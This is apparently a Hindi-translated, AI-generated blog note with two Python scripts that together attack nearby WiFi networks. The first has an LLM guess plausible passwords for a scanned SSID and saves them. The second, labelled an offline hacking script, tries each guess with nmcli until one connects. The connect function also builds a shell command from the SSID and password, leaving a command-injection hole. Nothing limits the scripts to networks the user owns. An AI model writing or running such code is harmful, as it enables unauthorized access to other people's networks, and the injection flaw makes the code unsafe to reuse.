---
audio: false
generated: true
image: false
lang: hi
layout: post
model: x-ai/grok-4-fast
title: वाई-फ़ाई पासवर्ड जनरेटर स्क्रिप्ट
translated: true
type: note
---

```python
#!/usr/bin/env python3
"""
WiFi पासवर्ड जनरेटर स्क्रिप्ट
WiFi नेटवर्क स्कैन करता है, उपयोगकर्ता को एक चुनने देता है, LLM का उपयोग करके सुझाए गए पासवर्ड जनरेट करता है, और @tmp डिरेक्टरी में सेव करता है।
इस स्क्रिप्ट को LLM के लिए ऑनलाइन एक्सेस की आवश्यकता है। सेव किए गए पासवर्ड के साथ कनेक्शन का प्रयास करने के लिए एक अलग ऑफलाइन स्क्रिप्ट का उपयोग करें।
"""

import os
import sys
from get_wifi_list import get_wifi_list
from openrouter_client import call_openrouter_api

# सुनिश्चित करें कि @tmp डिरेक्टरी मौजूद है
TMP_DIR = '@tmp'
os.makedirs(TMP_DIR, exist_ok=True)

def parse_wifi_list(wifi_output):
    """
    get_wifi_list के आउटपुट को पार्स करके SSID और विवरण निकालता है।
    'index', 'ssid', 'full_line' वाली डिक्शनरी की लिस्ट रिटर्न करता है।
    """
    networks = []
    lines = wifi_output.split('\n')
    current_ssid = None
    for i, line in enumerate(lines):
        if line.startswith('SSID: '):
            # लाइन से SSID निकालें
            ssid_part = line.split('SSID: ')[1].split(',')[0].strip()
            current_ssid = ssid_part
            networks.append({
                'index': len(networks) + 1,
                'ssid': current_ssid,
                'full_line': line
            })
        elif current_ssid and line.strip().startswith('  '):
            # अंतिम नेटवर्क में अतिरिक्त जानकारी जोड़ें यदि यह सब-लाइन है
            networks[-1]['full_line'] += '\n' + line
    return networks

def generate_password_suggestions(ssid, num_suggestions=10, model="deepseek-v3.2"):
    """
    दिए गए SSID के लिए सुझाए गए पासवर्ड जनरेट करने के लिए OpenRouter LLM का उपयोग करें।
    """
    prompt = f"एक '{ssid}' नाम के WiFi नेटवर्क के लिए {num_suggestions} संभावित पासवर्ड सुझाएं। उन्हें सामान्य पैटर्न, नाम, या डिफॉल्ट के आधार पर विश्वसनीय बनाएं। उन्हें नंबर दें, एक प्रति लाइन, कोई स्पष्टीकरण नहीं।"
    try:
        response = call_openrouter_api(prompt, model=model)
        # सिर्फ लिस्ट निकालने के लिए रिस्पांस को साफ करें
        lines = [line.strip() for line in response.split('\n') if line.strip() and line[0].isdigit()]
        passwords = [line.split('.', 1)[1].strip() if '.' in line else line for line in lines[:num_suggestions]]
        return passwords
    except Exception as e:
        print(f"पासवर्ड जनरेट करने में त्रुटि: {e}")
        return []

def save_passwords_to_file(ssid, passwords):
    """
    पासवर्ड की लिस्ट को @tmp डिर में एक फाइल में सेव करें।
    """
    filename = os.path.join(TMP_DIR, f"{ssid.replace(' ', '_')}_passwords.txt")
    with open(filename, 'w') as f:
        for pwd in passwords:
            f.write(f"{pwd}\n")
    print(f"पासवर्ड सेव किए गए: {filename}")
    return filename

def main():
    print("=== WiFi पासवर्ड जनरेटर ===")
    print()

    # WiFi लिस्ट प्राप्त करें
    print("उपलब्ध WiFi नेटवर्क स्कैन कर रहा है...")
    wifi_output = get_wifi_list()
    print("उपलब्ध WiFi नेटवर्क:")
    if wifi_output.startswith("No WiFi"):
        print(f"  {wifi_output}")
        sys.exit(1)

    # पार्स करें और नंबर की गई लिस्ट दिखाएं
    networks = parse_wifi_list(wifi_output)
    if not networks:
        print("कोई नेटवर्क नहीं मिला।")
        sys.exit(1)

    for net in networks:
        print(f"{net['index']}. {net['full_line']}")

    # उपयोगकर्ता इनपुट
    try:
        choice = int(input(f"\nएक नेटवर्क चुनें (1-{len(networks)}): "))
        if 1 <= choice <= len(networks):
            selected = networks[choice - 1]
            ssid = selected['ssid']
            print(f"\nचयनित: {ssid}")
        else:
            print("अमान्य विकल्प।")
            sys.exit(1)
    except ValueError:
        print("अमान्य इनपुट।")
        sys.exit(1)

    # पासवर्ड जनरेट करें
    print(f"\n'{ssid}' के लिए {10} पासवर्ड सुझाव जनरेट कर रहा है...")
    passwords = generate_password_suggestions(ssid)

    if passwords:
        print("सुझाए गए पासवर्ड:")
        for i, pwd in enumerate(passwords, 1):
            print(f"{i}. {pwd}")
        # फाइल में सेव करें
        save_passwords_to_file(ssid, passwords)
    else:
        print("पासवर्ड जनरेट करने में विफल।")

    print("\nकनेक्शन का प्रयास करने के लिए इस फाइल को पढ़ने के लिए एक अलग ऑफलाइन स्क्रिप्ट का उपयोग करें।")

if __name__ == "__main__":
    main()
```

ऑफलाइन हैकिंग स्क्रिप्ट (जैसे, `offline_hack_wifi.py`) के लिए, आप इसे अलग से बना सकते हैं ताकि `@tmp/{ssid}_passwords.txt` से पासवर्ड पढ़े और `nmcli` या `wpa_supplicant` जैसे टूल का उपयोग करके कनेक्ट करने का प्रयास करे। यहाँ एक बेसिक स्ट्रक्चर है:

```python
#!/usr/bin/env python3
"""
ऑफलाइन WiFi हैकर स्क्रिप्ट
सेव किए गए पासवर्ड पढ़ता है और चयनित WiFi से ऑफलाइन कनेक्ट होने का प्रयास करता है。
"""

import os
import subprocess
import sys

TMP_DIR = '@tmp'

def attempt_connect(ssid, password):
    """
    nmcli (या फॉलबैक) का उपयोग करके WiFi से कनेक्ट होने का प्रयास करें।
    """
    cmd = f"nmcli device wifi connect '{ssid}' password '{password}'"
    try:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"सफलता पासवर्ड के साथ: {password}")
            return True
        else:
            print(f"विफल पासवर्ड के साथ: {password}")
            return False
    except Exception as e:
        print(f"कनेक्ट करने के प्रयास में त्रुटि: {e}")
        return False

def main():
    ssid_file = input("SSID या @tmp में पूर्ण फाइलनाम दर्ज करें (उदा., MyWiFi_passwords.txt): ").strip()
    filepath = os.path.join(TMP_DIR, ssid_file)
    
    if not os.path.exists(filepath):
        print("फाइल नहीं मिली।")
        sys.exit(1)
    
    ssid = ssid_file.replace('_passwords.txt', '').replace('_', ' ')
    print(f"'{ssid}' से कनेक्ट होने का प्रयास कर रहा है...")
    
    with open(filepath, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]
    
    for pwd in passwords:
        if attempt_connect(ssid, pwd):
            break
    else:
        print("सभी पासवर्ड विफल रहे।")

if __name__ == "__main__":
    main()
```